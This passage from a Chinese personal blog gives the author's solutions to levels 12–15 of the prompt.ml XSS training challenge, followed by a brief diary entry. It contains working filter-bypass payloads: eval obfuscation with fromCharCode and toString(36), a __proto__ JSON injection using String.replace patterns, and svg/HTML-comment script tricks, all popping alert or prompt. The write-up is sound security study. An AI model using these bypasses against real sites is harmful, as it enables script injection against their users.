<p>Vector:(虽然做出来了.不过很长)<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(</span><br><span class="line">	<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>)</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">114</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">111</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">109</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">116</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>))</span><br><span class="line">		.concat(<span class="number">1</span>)</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">41</span>))</span><br><span class="line">)<span class="comment">//需要去掉\s</span></span><br></pre></td></tr></table></figure></p>
<p>不过答案还用了<code>toString()</code>,比较灵活~<br>vector2:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(</span><br><span class="line">	(<span class="number">1558153217</span>).toString(<span class="number">36</span>)  <span class="comment">//数字可以通过 parseInt('prompt', 36) 获得</span></span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>))</span><br><span class="line">		.concat(<span class="number">1</span>)</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">41</span>))</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>也是给我了一个提醒, 想起来以前密码学学的一个toString()和parseInt()的进制转化了.<br>嗯, github还有个改进版本<br>vector3:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="number">1558153217</span>).toString(<span class="number">36</span>))(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
<p>eval这个函数感觉像是没来过一样.完全不影响后续输出</p>
<p>vector4(变种):<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="number">1558153217.</span>.toString(<span class="number">36</span>))(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
<p>关于<code>.</code>的多义性直接戳<a href="https://gist.github.com/a1exlism/00dcfd26d2212e509d2cad28a6745574" target="_blank" rel="external">这个</a></p>
<h3 id="Level-13-input为json对象-String-repalce-绕过"><a href="#Level-13-input为json对象-String-repalce-绕过" class="headerlink" title="Level-13 input为json对象,String.repalce()绕过"></a>Level-13 input为json对象,String.repalce()绕过</h3><p>代码表示的比较清楚..</p>
<p>关键点</p>
<ol>
<li><a href="/08/13/2016/js-proto/">__proto__</a> 利用</li>
<li>String.replace() <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace#描述" target="_blank" rel="external">内置组<code>$\</code>, $`利用</a></li>
</ol>
<p>第二点的话再写个例子好了, 放在了<a href="https://gist.github.com/a1exlism/c6e507a7af27c68e644c520859934fbd" target="_blank" rel="external">gist</a>上.</p>
<p>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">"source"</span> : <span class="string">"-"</span>,</span><br><span class="line"> <span class="string">"__proto__"</span> : &#123;<span class="string">"source"</span> : <span class="string">"$`onerror=alert(1)&gt;"</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="Level-14-deprecated"><a href="#Level-14-deprecated" class="headerlink" title="Level-14-deprecated"></a>Level-14-deprecated</h3><p>原本思路是绕过img限制直接进行iframe的data协议xss, 但是uppercase已经无法绕过了..</p>
<h3 id="Level-15-HTML注释bypass-len限制"><a href="#Level-15-HTML注释bypass-len限制" class="headerlink" title="Level-15 HTML注释bypass/len限制"></a>Level-15 HTML注释bypass/len限制</h3><blockquote>
<p>input = input.replace(/*/g, ‘’);<br>var segments = input.split(‘#’);</p>
</blockquote>
<p>和Level-7类似, 不过被过滤了<code>*</code>,还有一个len15限制.<br>思路的话还是comment bypass, 依然是通过<code>svg</code>标签的扩展性导致javascript标签可以使用<code>html注释</code><br>vector:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="comment">&lt;!--#--&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="comment">&lt;!--#--&gt;</span>prompt(1)<span class="comment">&lt;!--#--&gt;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h4 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span>     #可以尝试把svg去掉, 看看会不会弹框</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"></span><br><span class="line">	<span class="comment">&lt;!--</span><br><span class="line">	"aaa'</span><br><span class="line">	alert(1)</span><br><span class="line">	--&gt;</span></span><br><span class="line">	alert(/xss/);</span><br><span class="line"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>嗯, 看了答案有几个不一样的.</p>
<h4 id="Firefox-amp-MSIE"><a href="#Firefox-amp-MSIE" class="headerlink" title="Firefox&amp;MSIE"></a>Firefox&amp;MSIE</h4><p>自动闭合所需标签, 少了几个字符<br>vector2:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="comment">&lt;!--#--&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="comment">&lt;!--#--&gt;</span>alert(1)<span class="tag">&lt;/</span></span></span></span><br></pre></td></tr></table></figure></p>
<p>第三个利用了ES6的模板解析<a href="/08/05/2016/js-template-strings/">这里</a><br>(也考虑到了`这个替代, 模板是没想到..)<br>vector3:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="string">`#<span class="subst">$&#123;prompt(1)&#125;</span>#`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>…hideen level没找到, 就不管了, 这些感觉够用了~</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Challenge:<br>  <a href="http://prompt.ml/0" target="_blank" rel="external">prompt</a><br>Writeup:<br>  <a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="external">github-cure53</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">


<div class="comments-count">
	
	  	<span></span>
		<a href="/08/07/2016/xss-4/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/07/2016/xss-4/" data-count-type="comments">&nbsp;</a>
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/08/07/2016/say-2/" title="无题" itemprop="url">无题</a>
  </h1>
  <p class="article-author">By
       
		<a href="https://plus.google.com/106896526077043222500?rel=author" title="a1exlism" target="_blank" itemprop="author">a1exlism</a>
		
  <p class="article-time">
    <time datetime="2016-08-06T16:00:00.000Z" itemprop="datePublished"> 发表于 08-07-2016</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><p><br><br><br>感觉一年下来感觉又是没什么成就, 有点烦.<br><br>有点事去看了一下域名, 发现work后缀的都变贵了233.可能这个域名对我来说算是最值钱的了哈哈<br><br>还有百度似乎并不收录work域名, 这个反而让我感觉很开心, 毕竟买的时候就考虑了这个问题, 嗯, 很好.<br><br>一到家就感觉有点适应不了, 总是贪玩, 怎么可以管不住自己呢. 自己好弱啊. 还有好多书要学啊, 还有一门语言也没碰呢.<br><br>第二件事情就是和协会老司机有点交流了, 谁让我一般不会去看qq的呢(其实就是不想用wine).<br></p>
<h3 id="exit"><a href="#exit" class="headerlink" title="exit()"></a>exit()</h3>
        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">


<div class="comments-count">
	
	  	<span></span>
		<a href="/08/07/2016/say-2/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/07/2016/say-2/" data-count-type="comments">&nbsp;</a>
	
</div>

</footer>


    </article>







  <nav id="page-nav" class="clearfix">
    <a class="extend prev" rel="prev" href="/page/2/"><span></span>Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/4/">Next<span></span></a>
  </nav>

</div>
      <div class="openaside"><a class="navbutton" href="#" title="Show"></a></div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="Hide"></a></div>
<aside class="clearfix">

  
  <div class="tagcloudlist">
    <p class="asidetitle">标签云</p>
    <div class="tagcloudlist clearfix">
       <a href="/tags/Arch/" style="font-size: 10px;">Arch</a> <a href="/tags/Automation/" style="font-size: 10px;">Automation</a> <a href="/tags/Bootstrap/" style="font-size: 10px;">Bootstrap</a> <a href="/tags/CS-GO/" style="font-size: 10px;">CS:GO</a> <a href="/tags/CSS/" style="font-size: 11.25px;">CSS</a> <a href="/tags/CodeIgniter/" style="font-size: 12.5px;">CodeIgniter</a> <a href="/tags/Device/" style="font-size: 15px;">Device</a> <a href="/tags/ES6/" style="font-size: 11.25px;">ES6</a> <a href="/tags/English/" style="font-size: 10px;">English</a> <a href="/tags/Experience/" style="font-size: 10px;">Experience</a> <a href="/tags/G4W/" style="font-size: 10px;">G4W</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/JavaScript/" style="font-size: 20px;">JavaScript</a> <a href="/tags/Kali/" style="font-size: 12.5px;">Kali</a> <a href="/tags/Linux/" style="font-size: 18.75px;">Linux</a> <a href="/tags/MySQL/" style="font-size: 15px;">MySQL</a> <a href="/tags/Note/" style="font-size: 10px;">Note</a> <a href="/tags/RWD/" style="font-size: 10px;">RWD</a> <a href="/tags/React/" style="font-size: 11.25px;">React</a> <a href="/tags/ReactNative/" style="font-size: 11.25px;">ReactNative</a> <a href="/tags/SQLInjection/" style="font-size: 11.25px;">SQLInjection</a> <a href="/tags/Shell/" style="font-size: 13.75px;">Shell</a> <a href="/tags/XSS/" style="font-size: 17.5px;">XSS</a> <a href="/tags/browser/" style="font-size: 10px;">browser</a> <a href="/tags/cmd/" style="font-size: 10px;">cmd</a> <a href="/tags/conference/" style="font-size: 11.25px;">conference</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/daily/" style="font-size: 15px;">daily</a> <a href="/tags/dns/" style="font-size: 10px;">dns</a> <a href="/tags/git/" style="font-size: 11.25px;">git</a> <a href="/tags/hard/" style="font-size: 12.5px;">hard</a> <a href="/tags/i18n/" style="font-size: 10px;">i18n</a> <a href="/tags/intranet/" style="font-size: 10px;">intranet</a> <a href="/tags/nexus5x/" style="font-size: 13.75px;">nexus5x</a> <a href="/tags/port/" style="font-size: 10px;">port</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/soft/" style="font-size: 12.5px;">soft</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/webdriver/" style="font-size: 10px;">webdriver</a> <a href="/tags/wifi/" style="font-size: 10px;">wifi</a> <a href="/tags/wireshark/" style="font-size: 10px;">wireshark</a> <a href="/tags/书记/" style="font-size: 16.25px;">书记</a> <a href="/tags/生活/" style="font-size: 10px;">生活</a> <a href="/tags/闲谈/" style="font-size: 13.75px;">闲谈</a> <a href="/tags/面试/" style="font-size: 10px;">面试</a> <a href="/tags/面试笔记/" style="font-size: 10px;">面试笔记</a>
    </div>
  </div>


  
  <div class="archiveslist">
    <p class="asidetitle"><a href="/archives">归档</a></p>
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">十月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">五月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">四月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">三月 2017</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">十二月 2016</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">十一月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">十月 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">九月 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">八月 2016</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">七月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">五月 2016</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">四月 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">三月 2016</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">二月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">一月 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">十二月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">13</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">1</span></li></ul>
  </div>


  <div class="linkslist">
  <p class="asidetitle">Links</p>
    <ul>
        
          <li>
            
            	<a href="http://www.regexr.com/" target="_blank" title="Regexr">Regexr</a>
            
          </li>
        
          <li>
            
            	<a href="http://man.linuxde.net/" target="_blank" title="Linux man">Linux man</a>
            
          </li>
        
          <li>
            
            	<a href="http://cssreference.io/" target="_blank" title="CSSReference">CSSReference</a>
            
          </li>
        
          <li>
            
            	<a href="http://howtocenterincss.com/" target="_blank" title="CenterInCSS">CenterInCSS</a>
            
          </li>
        
          <li>
            
            	<a href="https://nodejs.org/api" target="_blank" title="Node.js">Node.js</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.allacronyms.com/" target="_blank" title="English Dictionary">English Dictionary</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.processon.com/" target="_blank" title="ProcessOn">ProcessOn</a>
            
          </li>
        
          <li>
            
            	<a href="http://zh.wikipedia.org" target="_blank" title="Wiki">Wiki</a>
            
          </li>
        
          <li>
            
            	<a href="http://hexo.io/" target="_blank" title="Hexo">Hexo</a>
            
          </li>
        
    </ul>
</div>

  <div class="rsspart">
	<a href="/sitemap.xml" target="_blank" title="rss">RSS</a>
</div>

</aside>
</div>
    </div>
    <footer><div id="footer">
    
    <div class="line">
        <span></span>
        <div class="author"></div>
    </div>
    
    
    <section class="info">
        <p> Blog site <br/>
            </p>
    </section>
    
    <div class="social-font" class="clearfix">

        
        <a href="https://github.com/a1exlism" target="_blank" class="icon-github" title="github"></a>
        
        
        
        
        <a href="http://weibo.com/a1exlism" target="_blank" class="icon-weibo" title="微博"></a>
        
        
        <a href="https://www.facebook.com/a1exlism" target="_blank" class="icon-facebook"
           title="facebook"></a>
        
        
        
        
        
        <a href="https://plus.google.com/106896526077043222500?rel=author" target="_blank"
           class="icon-google_plus" title="Google+"></a>
        
        
    </div>
    
    

    <p class="copyright">
        Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a
                href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a>
        © 2017
        
        <a href="/about" target="_blank" title="a1exlism">a1exlism</a>
        

    </p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
        
    }
  });
});
</script>




<script type="text/javascript">
  var duoshuoQuery = {short_name:"a1exnet"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0] 
    || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
</script> 









<!-- Analytics Begin -->

<script type="text/javascript">
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-63657599-2', 'auto');
  ga('send', 'pageview');

</script>





<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="Top">
	</a>

		<!--<img src="/img/scrollup.png"/>-->
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Swift_search Begin -->

<script type="text/javascript">
  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
  
  _st('install','Mk-8yju65hSKp47D6qJW','2.0.0');
</script>


<!-- Tiny_search End -->
  </body>
 </html>
